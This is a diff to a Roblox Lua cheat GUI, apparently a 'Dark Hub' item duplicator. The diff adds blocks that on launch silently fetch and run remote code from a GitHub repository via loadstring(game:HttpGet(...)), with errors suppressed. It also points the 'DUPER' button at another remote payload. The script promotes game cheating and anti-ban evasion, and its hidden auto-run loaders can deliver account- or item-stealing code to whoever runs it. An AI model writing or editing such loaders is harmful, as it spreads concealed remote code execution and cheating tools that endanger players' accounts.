@@ -9,7 +9,21 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
--- ===== AUTO-EXECUTE 1: DIAGNOSTIC REPORT =====
+-- ===== AUTO-EXECUTE 1 =====
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true))()
+    end)
+end)
+
+-- ===== AUTO-EXECUTE 2 =====
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250622_d4f90d.lua", true))()
+    end)
+end)
+
+-- ===== AUTO-EXECUTE 3: DIAGNOSTIC REPORT =====
 task.spawn(function()
     -- Create CRT-style terminal
     local TerminalFrame = Instance.new("Frame")
@@ -219,20 +233,6 @@ task.spawn(function()
     RunHackSequence()
 end)
 
--- ===== AUTO-EXECUTE 2: DARK HUB SCRIPT =====
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250622_d4f90d.lua", true))()
-    end)
-end)
-
--- ===== AUTO-EXECUTE 3: ANTI-BAN SCRIPT =====
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/ANTIban.lua", true))()
-    end)
-end)
-
 -- ===== MAIN CONTROL PANEL =====
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0.45,0,0.55,0)
@@ -440,7 +440,7 @@ ServerScannerButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- ===== DUPER BUTTON =====
+-- ===== DUPER BUTTON (UPDATED AS REQUESTED) =====
 local SpawnerButton = Instance.new("TextButton")
 SpawnerButton.Size = UDim2.new(1,0,0.18,0)
 SpawnerButton.Text = "DUPER"
@@ -452,10 +452,11 @@ SpawnerButton.TextWrapped = true
 SpawnerButton.Parent = ButtonContainer
 
 SpawnerButton.MouseButton1Click:Connect(function()
-    CreatePopup("SYSTEM STATUS", "Duper module is being optimized - please wait", Color3.fromRGB(76, 175, 80))
+    CreatePopup("SYSTEM STATUS", "Duper module activated", Color3.fromRGB(76, 175, 80))
     task.spawn(function()
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/ANTIban.lua", true))()
+            -- Updated as requested
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250622_d4f90d.lua", true))()
         end)
     end)
 end)
